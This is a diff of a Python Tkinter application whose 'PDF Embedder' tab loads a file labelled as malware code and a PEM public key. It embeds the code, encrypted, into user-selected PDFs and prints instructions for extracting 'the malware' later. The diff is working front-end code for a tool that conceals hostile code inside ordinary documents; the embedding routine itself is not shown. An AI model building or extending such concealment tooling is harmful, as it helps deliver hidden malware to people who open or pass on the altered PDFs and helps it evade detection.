@@ -937,7 +937,7 @@ class CodeEmbedderApp:
 
         # Variables for PDF embedder inputs
         self.malware_code_path_pdf = ""  # Unique variable for PDF Embedder
-        self.selected_public_key_pdf = StringVar()
+        self.public_key_path_pdf = ""  # Path for selected PEM public key
         self.pdf_folder_path = ""
         self.pdf_files_selected = {}
 
@@ -966,19 +966,20 @@ class CodeEmbedderApp:
         self.upload_status_label_pdf = ttk.Label(top_frame_pdf, text="No file uploaded.", foreground="blue")
         self.upload_status_label_pdf.grid(row=1, column=0, columnspan=4, sticky="w", padx=5, pady=5)
 
-        # RSA Key Selection and Generation section in PDF Embedder
-        ttk.Label(top_frame_pdf, text="Public Key:").grid(row=2, column=0, sticky="w")
-        self.keypair_dropdown_pdf = ttk.OptionMenu(top_frame_pdf, self.selected_public_key_pdf, "")
-        self.keypair_dropdown_pdf.grid(row=2, column=1, sticky="ew", padx=5)
-        self.generate_keypair_btn_pdf = ttk.Button(top_frame_pdf, text="Generate RSA Key Pair",
-                                                   command=self.generate_rsa_keypair_pdf)
-        self.generate_keypair_btn_pdf.grid(row=2, column=2, sticky="ew", padx=5)
+        # Public Key PEM File Upload
+        ttk.Label(top_frame_pdf, text="Public Key (PEM):").grid(row=2, column=0, sticky="w")
+        self.upload_public_key_btn_pdf = ttk.Button(top_frame_pdf, text="Upload Public Key",
+                                                    command=self.load_public_key_pdf)
+        self.upload_public_key_btn_pdf.grid(row=2, column=1, sticky="ew", padx=5)
+        self.show_public_key_btn_pdf = ttk.Button(top_frame_pdf, text="Show Public Key",
+                                                  command=self.show_public_key_pdf)
+        self.show_public_key_btn_pdf.grid(row=2, column=2, sticky="ew", padx=5)
 
-        # Tooltip for RSA Key generation in PDF Embedder
+        # Tooltip for Public Key upload in PDF Embedder
         info_icon_key_pdf = tk.Label(top_frame_pdf, text="ℹ️", font=("Arial", 14), cursor="hand2")
         info_icon_key_pdf.grid(row=2, column=3, sticky="w", padx=5)
-        keypair_tooltip_text_pdf = "Generate or select an RSA key pair for embedding in PDFs."
-        ToolTip(info_icon_key_pdf, keypair_tooltip_text_pdf)
+        public_key_tooltip_text_pdf = "Select an existing PEM public key to embed in PDFs."
+        ToolTip(info_icon_key_pdf, public_key_tooltip_text_pdf)
 
         # PDF Folder selection for input files
         ttk.Label(top_frame_pdf, text="PDF Input Folder:").grid(row=3, column=0, sticky="w")
@@ -1008,15 +1009,6 @@ class CodeEmbedderApp:
         self.keygen_status_label_pdf = ttk.Label(self.pdf_embed_frame, text="", foreground="green")
         self.keygen_status_label_pdf.grid(row=4, column=0, sticky="w", padx=10, pady=5)
 
-        output_dir = "Output"
-        os.makedirs(output_dir, exist_ok=True)
-
-        # Detect existing public keys
-        pub_keys = list(Path(output_dir).glob("*.pub"))
-
-        # Update the dropdown with existing keys
-        self.update_keypair_dropdown_pdf(pub_keys)
-
     def load_malware_file_pdf(self):
         """Load the malware code file specifically for PDF Embedder."""
         self.malware_code_path_pdf = filedialog.askopenfilename(
@@ -1024,61 +1016,62 @@ class CodeEmbedderApp:
             filetypes=[("Python files", "*.py")]
         )
         if self.malware_code_path_pdf:
-            # Update success status label
             self.upload_status_label_pdf.config(text=f"Uploaded: {os.path.basename(self.malware_code_path_pdf)}")
-
-            # Display uploaded code in the PDF embedder result box
             with open(self.malware_code_path_pdf, 'r') as f:
                 code_content = f.read()
             self.result_box_pdf_embed.delete(1.0, tk.END)
             self.result_box_pdf_embed.insert(tk.END, f"Loaded Malware Code for PDF Embed:\n{code_content}\n")
 
-    def generate_rsa_keypair_pdf(self):
-        """Generate an RSA keypair if not existing and update the dropdown specifically for PDF Embedder."""
-        output_dir = "Output"
-        os.makedirs(output_dir, exist_ok=True)
+    def load_public_key_pdf(self):
+        """Load the PEM public key file for PDF Embedder."""
+        self.public_key_path_pdf = filedialog.askopenfilename(
+            title="Select Public Key",
+            filetypes=[("PEM files", "*.pem")]
+        )
+        if self.public_key_path_pdf:
+            self.keygen_status_label_pdf.config(text=f"Uploaded: {os.path.basename(self.public_key_path_pdf)}")
 
-        # Detect existing public keys
-        pub_keys = list(Path(output_dir).glob("*.pub"))
-
-        # Update the dropdown with existing keys
-        self.update_keypair_dropdown_pdf(pub_keys)
-
-        # Generate new RSA key pair only if none exist or if user opts to create a new one
-        if not pub_keys or messagebox.askyesno("Generate New Key", "No key pair found. Generate new key pair?"):
-            counter = 0
-            private_key = Path(output_dir, f"keypair_{counter}")
-            public_key = private_key.with_suffix(".pub")
-
-            # Ensure no overwrite by checking for unique file names
-            while private_key.exists() or public_key.exists():
-                counter += 1
-                private_key = Path(output_dir, f"keypair_{counter}")
-                public_key = private_key.with_suffix(".pub")
-
-            # Generate RSA key pair content (dummy example)
-            private_key.write_text("PRIVATE_KEY_CONTENT")
-            public_key.write_text("PUBLIC_KEY_CONTENT")
-
-            # Update key pair dropdown and show success message
-            self.update_keypair_dropdown_pdf([public_key])
-            self.keygen_status_label_pdf.config(text=f"Generated keypair: {public_key.name}")
-            self.keygen_status_label_pdf.update_idletasks()
-
-    def update_keypair_dropdown_pdf(self, pub_keys):
-        """Update dropdown menu with available public keys in Output folder for PDF Embedder."""
-        menu = self.keypair_dropdown_pdf["menu"]
-        menu.delete(0, "end")
-
-        # Populate dropdown with each available key
-        for key in pub_keys:
-            menu.add_command(label=key.name, command=lambda value=key.name: self.selected_public_key_pdf.set(value))
-
-        if pub_keys:
-            # Set the first key as default if any exist
-            self.selected_public_key_pdf.set(pub_keys[0].name)
+    def show_public_key_pdf(self):
+        """Display the content of the uploaded PEM public key file."""
+        if self.public_key_path_pdf:
+            with open(self.public_key_path_pdf, 'r') as f:
+                key_content = f.read()
+            self.result_box_pdf_embed.delete(1.0, tk.END)
+            self.result_box_pdf_embed.insert(tk.END, f"Loaded Public Key:\n{key_content}\n")
         else:
-            self.selected_public_key_pdf.set("No keys available")
+            messagebox.showerror("Error", "No public key file uploaded.")
+
+    def submit_pdf_embed(self):
+        """Submit the PDF files for embedding."""
+        selected_pdfs = [f for f, var in self.pdf_files_selected.items() if var.get() == 1]
+        if not self.malware_code_path_pdf:
+            messagebox.showerror("Error", "Please upload a malware file.")
+            return
+        if not selected_pdfs:
+            messagebox.showerror("Error", "Please select at least one PDF file.")
+            return
+        if not self.public_key_path_pdf:
+            messagebox.showerror("Error", "Please select a PEM public key file.")
+            return
+
+        output_folder = Path("Output/embedded_pdf_files")
+        output_folder.mkdir(parents=True, exist_ok=True)
+
+        # Call your embed_in_pdf function here
+        from PDF import embed_pdf_rsa as pdf
+        success = pdf.embed_python_in_multiple_pdfs(self.malware_code_path_pdf, selected_pdfs, self.public_key_path_pdf)
+
+        if success:
+            output_files = [output_folder / pdf for pdf in selected_pdfs]
+            self.result_box_pdf_embed.delete(1.0, tk.END)
+            self.result_box_pdf_embed.insert(tk.END, "Embedding successful!\nFiles saved to:\n")
+            for file in output_files:
+                self.result_box_pdf_embed.insert(tk.END, f"{file}\n")
+            self.result_box_pdf_embed.insert(tk.END, "\nTo extract the malware, use:\n")
+            self.result_box_pdf_embed.insert(tk.END,
+                                             "Usage:\npython extract_pdf_rsa.py <private_key.pem> <pdf_file_1> <pdf_file_2> ... <output_python_file>\n")
+        else:
+            self.result_box_pdf_embed.insert(tk.END, "An error occurred during PDF embedding.")
 
     def show_malware_code_pdf(self):
         """Display the malware code in a text box."""
@@ -1094,51 +1087,22 @@ class CodeEmbedderApp:
         """Select folder containing PDFs and display available files as checkboxes."""
         self.pdf_folder_path = filedialog.askdirectory(title="Select PDF Folder")
         if self.pdf_folder_path:
-            for widget in self.pdf_checkboxes_frame.winfo_children():
+            # Clear existing checkboxes in the pdf_checkboxes_frame
+            for widget in self.pdf_checkboxes_frame_pdf.winfo_children():
                 widget.destroy()
 
-            # Display PDFs as checkboxes
+            # Display PDFs as checkboxes with full path stored
             pdf_files = [f for f in os.listdir(self.pdf_folder_path) if f.endswith(".pdf")]
             self.pdf_files_selected = {}
             for i, pdf_file in enumerate(pdf_files):
                 var = IntVar(value=0)
-                checkbox = Checkbutton(self.pdf_checkboxes_frame, text=pdf_file, variable=var)
+                # Display filename only, store full path
+                checkbox = ttk.Checkbutton(self.pdf_checkboxes_frame_pdf, text=pdf_file, variable=var)
                 checkbox.grid(row=i, column=0, sticky="w")
-                self.pdf_files_selected[pdf_file] = var
+                full_path = os.path.join(self.pdf_folder_path, pdf_file)
+                self.pdf_files_selected[full_path] = var
 
-    def submit_pdf_embed(self):
-        """Submit the PDF files for embedding."""
-        selected_pdfs = [f for f, var in self.pdf_files_selected.items() if var.get() == 1]
-        if not self.malware_code_path_pdf:
-            messagebox.showerror("Error", "Please upload a malware file.")
-            return
-        if not selected_pdfs:
-            messagebox.showerror("Error", "Please select at least one PDF file.")
-            return
-        if not self.selected_public_key.get():
-            messagebox.showerror("Error", "Please select or generate an RSA key pair.")
-            return
 
-        public_key_path = os.path.join("Output", self.selected_public_key.get())
-        output_folder = Path("Output/embedded_pdf_files")
-        output_folder.mkdir(parents=True, exist_ok=True)
-
-        # Call your embed_in_pdf function here
-        from PDF import embed_pdf_rsa as pdf
-        success = pdf.embed_python_in_multiple_pdfs(self.malware_code_path_pdf, selected_pdfs, public_key_path)
-
-        # success = True  # Replace with the actual call to `embed_in_pdf`
-        if success:
-            output_files = [output_folder / pdf for pdf in selected_pdfs]
-            self.result_box_pdf_embed.delete(1.0, tk.END)
-            self.result_box_pdf_embed.insert(tk.END, "Embedding successful!\nFiles saved to:\n")
-            for file in output_files:
-                self.result_box_pdf_embed.insert(tk.END, f"{file}\n")
-            self.result_box_pdf_embed.insert(tk.END, "\nTo extract the malware, use:\n")
-            self.result_box_pdf_embed.insert(tk.END,
-                                             "Usage:\npython extract_pdf_rsa.py <private_key.pem> <pdf_file_1> <pdf_file_2> ... <output_python_file>\n")
-        else:
-            self.result_box_pdf_embed.insert(tk.END, "An error occurred during PDF embedding.")
 
     def create_cython_tab(self):
         """Create the Compile with Cython tab for taking a Python file input, showing code, and compiling with
